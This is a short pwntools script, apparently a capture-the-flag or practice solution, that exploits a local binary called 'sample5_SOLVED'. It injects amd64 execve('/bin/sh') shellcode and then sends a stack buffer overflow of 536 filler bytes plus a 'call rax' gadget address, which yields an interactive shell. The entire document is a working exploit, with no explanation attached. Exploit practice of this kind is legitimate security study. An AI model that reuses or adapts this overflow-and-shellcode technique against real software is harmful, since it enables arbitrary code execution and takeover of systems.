#!/usr/bin/python3

from pwn import *

context.binary = elf = ELF("./sample5_SOLVED", checksec = False)
con = process()
#gdb.attach(con, gdbscript = "start")
call_rax = 0x0000000000401014
binsh = u64("/bin/sh\0")

shellcode = asm(
        f'''
        mov rax, 0x3b
        mov rdi, {binsh} 
        push rdi
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        syscall
        ''', arch = 'amd64')

input()

con.send(shellcode)

payload = b"A"* 536 + p64(call_rax)

input()
con.send(payload)

con.interactive()
